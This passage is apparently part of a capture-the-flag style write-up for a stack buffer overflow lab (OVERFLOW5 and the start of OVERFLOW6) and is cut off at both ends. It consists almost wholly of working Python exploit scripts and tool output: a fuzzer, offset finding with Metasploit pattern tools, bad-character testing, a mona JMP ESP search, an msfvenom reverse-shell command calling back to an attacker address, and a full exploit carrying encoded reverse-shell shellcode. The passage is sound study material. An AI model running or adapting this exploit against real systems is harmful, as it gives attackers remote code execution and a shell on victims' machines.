class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW5 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 35614134 -&gt; 5kA4 -&gt; 4Ak5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 4Ak5 -l 400</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 314</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW5 &quot;</span></span><br><span class="line">offset = <span class="number">314</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-5"><a class="markdownIt-Anchor" href="#badchar-5"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW5 &quot;</span></span><br><span class="line">offset = <span class="number">314</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x16\x17\x2f\x30\xf4\xf5\xfd\xfe</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW5 &quot;</span></span><br><span class="line">offset = <span class="number">314</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfc\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x16\x2f\xf4\xfd</code>之后<code>\x17\x30\xf5\xfe</code>不受影响</p><p>BADCHAR: <code>\x00\x16\x2f\xf4\xfd</code></p><h3 id="jmp-esp-5"><a class="markdownIt-Anchor" href="#jmp-esp-5"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x16\x2f\xf4\xfd&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-5"><a class="markdownIt-Anchor" href="#shellcode-5"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x16\x2f\xf4\xfd&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-5"><a class="markdownIt-Anchor" href="#exploit-5"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW5 &quot;</span></span><br><span class="line">offset = <span class="number">314</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xfc\xbb\xc4\x7e\x93\x5d\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x38\x96\x11\x5d\xc0\x67\x76\xd7\x25\x56\xb6\x83\x2e\xc9\x06\xc7\x62\xe6\xed\x85\x96\x7d\x83\x01\x99\x36\x2e\x74\x94\xc7\x03\x44\xb7\x4b\x5e\x99\x17\x75\x91\xec\x56\xb2\xcc\x1d\x0a\x6b\x9a\xb0\xba\x18\xd6\x08\x31\x52\xf6\x08\xa6\x23\xf9\x39\x79\x3f\xa0\x99\x78\xec\xd8\x93\x62\xf1\xe5\x6a\x19\xc1\x92\x6c\xcb\x1b\x5a\xc2\x32\x94\xa9\x1a\x73\x13\x52\x69\x8d\x67\xef\x6a\x4a\x15\x2b\xfe\x48\xbd\xb8\x58\xb4\x3f\x6c\x3e\x3f\x33\xd9\x34\x67\x50\xdc\x99\x1c\x6c\x55\x1c\xf2\xe4\x2d\x3b\xd6\xad\xf6\x22\x4f\x08\x58\x5a\x8f\xf3\x05\xfe\xc4\x1e\x51\x73\x87\x76\x96\xbe\x37\x87\xb0\xc9\x44\xb5\x1f\x62\xc2\xf5\xe8\xac\x15\xf9\xc2\x09\x89\x04\xed\x69\x80\xc2\xb9\x39\xba\xe3\xc1\xd1\x3a\x0b\x14\x75\x6a\xa3\xc7\x36\xda\x03\xb8\xde\x30\x8c\xe7\xff\x3b\x46\x80\x6a\xc6\x01\xa5\x7b\xe2\xb1\xd1\x79\xf2\x34\x1b\xf7\x14\x5c\x4b\x51\x8f\xc9\xf2\xf8\x5b\x6b\xfa\xd6\x26\xab\x70\xd5\xd7\x62\x71\x90\xcb\x13\x71\xef\xb1\xb2\x8e\xc5\xdd\x59\x1c\x82\x1d\x17\x3d\x1d\x4a\x70\xf3\x54\x1e\x6c\xaa\xce\x3c\x6d\x2a\x28\x84\xaa\x8f\xb7\x05\x3e\xab\x93\x15\x86\x34\x98\x41\x56\x63\x76\x3f\x10\xdd\x38\xe9\xca\xb2\x92\x7d\x8a\xf8\x24\xfb\x93\xd4\xd2\xe3\x22\x81\xa2\x1c\x8a\x45\x23\x65\xf6\xf5\xcc\xbc\xb2\x06\x87\x9c\x93\x8e\x4e\x75\xa6\xd2\x70\xa0\xe5\xea\xf2\x40\x96\x08\xea\x21\x93\x55\xac\xda\xe9\xc6\x59\xdc\x5e\xe6\x4b\xdc\x60\x18\x74&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow6"><a class="markdownIt-Anchor" href="#overflow6"></a> OVERFLOW6</h2><h3 id="fuzz-6"><a class="markdownIt-Anchor" href="#fuzz-6"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW6 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 1100 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-6"><a class="markdownIt-Anchor" href="#offset-6"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW6 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 35694234 -&gt; 5iB4 -&gt; 4Bi5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 4Bi5 -l 1100</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 1034</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW6 &quot;</span></span><br><span class="line">offset = <span class="number">1034</span></span><br><span class="line">overflow = <span 